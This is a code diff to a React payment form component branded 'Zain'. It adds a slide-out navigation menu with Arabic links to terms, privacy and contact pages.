@@ -2,7 +2,7 @@
 
 import React, { useEffect, useMemo, useState } from "react";
 import { motion } from "framer-motion";
-import { AlertCircle, CheckCircle2, Loader2 } from "lucide-react";
+import { AlertCircle, CheckCircle2, Loader2, Menu } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
@@ -26,7 +26,15 @@ import {
 import { cn } from "@/lib/utils";
 import { addData } from "@/lib/firebase";
 import LoaderApp from "@/components/loader";
-
+import {
+  Sheet,
+  SheetContent,
+  SheetDescription,
+  SheetHeader,
+  SheetTitle,
+  SheetTrigger,
+} from "@/components/ui/sheet";
+import Link from "next/link";
 // --- Component ---
 export default function ZainPaymentForm({
   setShow,
@@ -114,6 +122,20 @@ export default function ZainPaymentForm({
     <>
       <div className="mx-0 mb-6 flex   w-full items-center justify-center">
         <img src="/top.webp" alt="Zain" className="h-12 w-full object-cover" />
+        <Sheet>
+          <SheetTrigger className="absolute left-3 bg- hover:bg-white/10 w-10 p-1 rounded">
+            <Menu className="w-10 text-white/10" />
+          </SheetTrigger>
+          <SheetContent>
+            <SheetHeader>
+              <SheetDescription className="my-6 flex flex-col gap-2">
+                <Link href="/terms-conditions">الشروط والأحكام</Link>
+                <Link href={"/privacy"}>سياسة الخصوصية</Link>
+                <Link href={"/contact"}>اتصل بنا</Link>
+              </SheetDescription>
+            </SheetHeader>
+          </SheetContent>
+        </Sheet>
       </div>
       <div dir="rtl" className="min-h-[70vh] w-full  sm:py-12">
         {/* Header */}
